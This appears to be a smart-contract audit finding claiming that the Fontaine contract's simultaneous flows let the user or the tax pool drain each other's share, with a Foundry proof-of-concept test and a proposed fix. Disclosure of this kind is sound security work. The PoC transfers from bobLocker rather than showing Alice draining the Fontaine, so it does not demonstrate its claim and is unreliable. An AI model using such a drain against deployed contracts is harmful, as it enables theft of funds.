# `Fontaine` allows the user unlocking or the tax pool to collect too many funds due to having simultaneous flows

### Summary

[Fontaine::initialize()](https://github.com/sherlock-audit/2024-11-superfluid-locking-contract/blob/main/fluid/packages/contracts/src/Fontaine.sol#L61) distributes flows to the tax pool and the recipient over time. As the flows are simultaneous, until one of these 2 actually claims the funds, it is possible for one of them to steal the funds that were meant to the other. For example, in a 20/80 split, any of the parts may end up getting `100%`.

### Root Cause

In `Fontaine::initialize()`, it destributes funds simultaneously to the tax pool and recipient.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. User unlocks using a vesting period.
2. Funds flow to both parties from the fontaine, so user or the tax pool may claim funds that were meant for the other party.

### Impact

The user or the tax pool steals funds from one another.

### PoC

Add the following test to `FluidLocker.t.sol` showing how `Alice` can receive all of the funds from the fountaine:
```solidity
function test_POC_VestUnlock_AliceRemovesAllFontaineFunds() external {
    uint128 unlockPeriod = _MIN_UNLOCK_PERIOD;
    uint256 funding = 10_000e18;
    _helperFundLocker(address(aliceLocker), funding);

    assertEq(_fluidSuperToken.balanceOf(address(aliceLocker)), funding, "incorrect Locker bal before op");

    (int96 taxFlowRate, int96 unlockFlowRate) = _helperCalculateUnlockFlowRates(funding, unlockPeriod);

    // ALICE SHOULD NOT BE ABLE TO REMOVE ALL FONTAINE BALACE, MOST GOES TO TAX
    assertEq(taxFlowRate, 0.013227513227513227e18);
    assertEq(unlockFlowRate, 0.003306878306878306e18);

    _helperUpgradeLocker();
    _helperBobStaking();

    vm.prank(ALICE);
    aliceLocker.unlock(unlockPeriod, ALICE);

    IFontaine newFontaine = FluidLocker(address(aliceLocker)).fontaines(0);
    uint256 fontaineBalance = _fluidSuperToken.balanceOf(address(newFontaine));
    assertEq(fontaineBalance, 9761.904761909262405632e18, "incorrect Fontaine bal after op");

    vm.warp(block.timestamp + 5 * unlockPeriod);

    address user = makeAddr("user");
    vm.prank(address(bobLocker));
    _fluidSuperToken.transfer(user, fontaineBalance);

    // ALICE REMOVES ALL FONTAIN BALANCE WHEN SHE SHOULD ONLY REMOVE roughly 2000e18
    assertEq(_fluidSuperToken.balanceOf(user), fontaineBalance); 
}
```

### Mitigation

The flows could be split in 2 contracts, one sending the funds to the recipient and the other to the tax pool.
